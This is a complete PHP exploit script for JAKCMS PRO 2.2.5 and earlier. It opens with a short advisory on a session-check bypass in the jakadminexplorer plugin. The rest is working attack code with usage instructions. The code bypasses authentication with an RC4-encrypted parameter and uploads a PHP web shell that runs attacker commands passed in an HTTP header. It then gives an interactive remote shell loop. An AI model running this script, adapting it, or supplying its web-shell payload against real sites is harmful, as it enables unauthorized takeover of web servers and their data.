    

    [-] vulnerable code in /js/editor/plugins/jakadminexplorer/php/session.php

    

    119.    if ($SESSION["check_session_variable"] != "") {

    120.    

    121.        // Session Starten

    122.        session_start();

    123.    

    124.        // Session-Variable überprüfen

    125.        if (!isset($_SESSION[$SESSION["check_session_variable"]])) {

    126.            include("error.php");

    127.            die;

    128.        }

    129.    }

    

    This authentication schema could be bypassed due to an attacker might be able to start a session accessing to /index.php that set

    for e.g. the "jak_lastURL" session variable, so could be set $SESSION["check_session_variable"] to bypass the check at line 125.

    Successful exploitation allows attackers access to plugins functionality (see /js/editor/plugins/jakadminexplorer/php/action.php),

    in this way an attacker could be able to "delete", "create", "rename" any folder/file into webserver or upload arbitrary files.

    The same vulnerability afflicts also jakadminimage, jakusrexplorer and jakusrimage plugins. 

    




error_reporting(0);

set_time_limit(0);

ini_set("default_socket_timeout", 5);



function http_send($host, $packet)

{

    if (!($sock = fsockopen($host, 80)))

        die("\n[-] No response from {$host}:80\n");

 

    fputs($sock, $packet);

    return stream_get_contents($sock);

}



function RC4($data)

{

    $key = "asvKHQFkoobdwdin4bi30xzb003ufkxS3Fu3HArhBnlIk5pr3D6OGSKvUbso1rtne42VekxwUmOtPgmcA1iYC6lrpWP7HXq6VdB8EnbzR0L8rIHMqSY8mIi0o3ROzZWe";

    $s = range(0, 256);

    $j = 0;



    for ($i = 0; $i < 256; $i++)

    {

        $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;

        $x = $s[$i];

        $s[$i] = $s[$j];

        $s[$j] = $x;

    }

    

    $i = $j = 0;

    $ct = "";

    

    for ($y = 0; $y < strlen($data); $y++)

    {

        $i = ($i + 1) % 256;

        $j = ($j + $s[$i]) % 256;

        $x = $s[$i];

        $s[$i] = $s[$j];

        $s[$j] = $x;

        $ct .= $data[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);

    }

    

    return $ct;

}



print "\n+------------------------------------------------------------------+";

print "\n| JAKCMS PRO <= 2.2.5 Remote Arbitrary File Upload Exploit by EgiX |";

print "\n+------------------------------------------------------------------+\n";

 

if ($argc < 3)

{

    print "\nUsage......: php $argv[0] <host> <path>\n";

    print "\nExample....: php $argv[0] localhost /";

    print "\nExample....: php $argv[0] localhost /jakcms/\n";

    die();

}



$host = $argv[1];

$path = $argv[2];



$packet  = "GET {$path} HTTP/1.0\r\n";

$packet .= "Host: {$host}\r\n";

$packet .= "Connection: close\r\n\r\n";



preg_match("/PHPSESSID=([^;]*);/i", http_send($host, $packet), $m);

$sid = $m[1];



$payload  = "--o0oOo0o\r\n";

$payload .= "Content-Disposition: form-data; name=\"edit1\"\r\n\r\n.php\r\n";

$payload .= "--o0oOo0o\r\n";

$payload .= "Content-Disposition: form-data; name=\"input1\"; filename=\"foo\"\r\n\r\n";

$payload .= "<?php \${error_reporting(0)}.\${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))} ?>\r\n";

$payload .= "--o0oOo0o--\r\n";



$get = bin2hex(RC4("id=1&check_session_variable=jak_lastURL&upload_filetype=php&dir={$path}cache/sh"));



$packet  = "POST {$path}js/editor/plugins/jakadminexplorer/?action=upload&get={$get} HTTP/1.0\r\n";

$packet .= "Host: {$host}\r\n";

$packet .= "Cookie: PHPSESSID={$sid}\r\n";

$packet .= "Content-Length: ".strlen($payload)."\r\n";

$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";

$packet .= "Connection: close\r\n\r\n";

$packet .= $payload;



if (preg_match("/Error/", http_send($host, $packet))) die("\n[-] Upload failed!\n");



$packet  = "GET {$path}cache/sh.php HTTP/1.0\r\n";

$packet .= "Host: {$host}\r\n";

$packet .= "Cmd: %s\r\n";

$packet .= "Connection: close\r\n\r\n";

    

while(1)

{

    print "\njakcms-shell# ";

    if (($cmd = trim(fgets(STDIN))) == "exit") break;

    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ? print $m[1] : die("\n[-] Exploit failed!\n");

}



?>